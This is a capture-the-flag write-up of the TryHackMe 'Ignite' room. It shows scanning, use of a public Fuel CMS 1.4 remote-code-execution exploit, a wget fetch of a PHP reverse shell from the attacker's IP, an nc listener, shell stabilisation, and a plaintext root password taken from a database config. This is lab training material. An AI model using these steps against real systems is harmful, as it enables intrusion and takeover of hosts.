---
title: TryHackMe Ignite [CHALLENGE]
date: 2024-04-01 00:00:00 +0800
categories: [TryHackMe, Challenge]
tags: [walkthough,write-ups]     # TAG names should always be lowercase
image:
    path: https://tryhackme-images.s3.amazonaws.com/room-icons/676cb3273c613c9ba00688162efc0979.png
---

A new start-up has a few issues with their web server.

## **Skills Needed**

Searching exploit, CMS, Privilege escalation, Database

## **Reconnaissance**
---
Initially do the Nmap scan.

```bash
nmap -sC -sV -p- $IP --open
```
`--open`: Scans only the open ports and reduces the time it takes to complete the nmap scan.


```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-21 07:09 EDT
Stats: 0:01:23 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 80.65% done; ETC: 07:11 (0:00:20 remaining)
Nmap scan report for 10.10.164.210
Host is up (0.29s latency).
Not shown: 65217 closed tcp ports (conn-refused), 317 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/fuel/
|_http-title: Welcome to FUEL CMS

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 115.27 seconds
```

## **Insights and To-TRY List**
---
OS: Ubuntu

80 → HTTP

- Using Fuel CMS version 1.4
- Has a public exploit for remote code execution. CVE 2018-16763
- Using default credentials for the admin page
- Cannot upload php file

## **Enumeration**
---
### 80 HTTP

**Viewing the webpage.**

![Desktop View](/assets/images/ignite/cms.png){: width="972" height="589" }

Upon doing some manual enumeration, I found that robots.txt is accessible

![Desktop View](/assets/images/ignite/robots.png){: width="972" height="589" }

Inspecting the CMS website.

![Desktop View](/assets/images/ignite/inspect-cms.png){: width="972" height="589" }

Altohugh I am well aware that there is an existing admin directory, I still do some directory busting to be sure that I am not missing something.

**Using gobuster**

```go
gobuster dir -u http://10.10.164.210/ -w /opt/SecLists/Discovery/Web-Content/raft-large-directories.txt -k -t 30
```
![Desktop View](/assets/images/ignite/gobuster.png){: width="972" height="589" }

Seems like it is the only page that is accessbile.

**Visiting the fuel admin page**

![Desktop View](/assets/images/ignite/admin-apge.png){: width="972" height="589" }

While exploring, I have found an upload page but it seems there is a filter that denies the php file extension.

![Desktop View](/assets/images/ignite/php-deny.png){: width="972" height="589" }

## **Gaining an Initial Foothold**

I've decided to search for a public exploit for Fuel CMS since we know the current version it's running, and we haven't found a way to upload a reverse shell yet.

Fortunately, I found one!

[Fuel CMS v1.4 public exploit](https://www.exploit-db.com/exploits/50477)

Download the exploit and execute using the command

```go
python3 <exploit-name> -u <http://IP>
```
![Desktop View](/assets/images/ignite/exploit-cms.png){: width="972" height="589" }

Upon directory listing, we can see the "robots.txt" file, which we were able to access earlier during manual enumeration. This implies that we can also execute a file once the browser client sends a "GET" request to the server. Therefore, we can obtain a reverse shell by downloading a PHP reverse shell from our local machine.

For attacking machine

```bash
python3 -m http.server
```
For target machine

```bash
wget http://10.13.50.82:8000/php-reverse-shell.php
```

![Desktop View](/assets/images/ignite/rce.png){: width="972" height="589" }

Once the PHP reverse shell has been uploaded, encode it to the browser to make a GET request to the server, enabling us to obtain a reverse shell. Don't forget to set up the listener as specified in the PHP reverse shell script.

```bash
nc -lnvp 1234
```

```bash
10.10.164.210/php-reverse-shell.php
```
![Desktop View](/assets/images/ignite/rev-shell.png){: width="972" height="589" }

Upon checking, python3 is installed in the machine. That means we can stabilize our dumb shell!

![Desktop View](/assets/images/ignite/dumb-shell.png){: width="972" height="589" }

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
export TERM=xterm-256color
alias ll='clear -lsaht --color=auto'

**Ctrl + Z [Background Process]**
stty raw -echo ; fg ; reset
stty columns 200 rows 200
```
![Desktop View](/assets/images/ignite/stable-shell.png){: width="972" height="589" }

> Do not forget to find the flag
{: .prompt-danger }

## **Privilege Escalation**
---
After falling down the rabbit hole of finding some ways to root the box, I decided to take a look again at the homepage. Fortunately, setting up the database for the CMS has instructions where we can access it, which probably contains default credentials.

![Desktop View](/assets/images/ignite/install.png){: width="972" height="589" }

![Desktop View](/assets/images/ignite/db.png){: width="972" height="589" }

Viewing the file

![Desktop View](/assets/images/ignite/creds.png){: width="972" height="589" }

Let us try switching root

```bash
su root
mememe
```

![Desktop View](/assets/images/ignite/root.png){: width="972" height="589" }

> Do not forget to find the root flag
{: .prompt-danger }

## **Take Away Concepts**
- Read the default page of CMS — it may contain some useful information and default credentials. It could be an instruction of where to access sensitive information that the user haven’t changed.


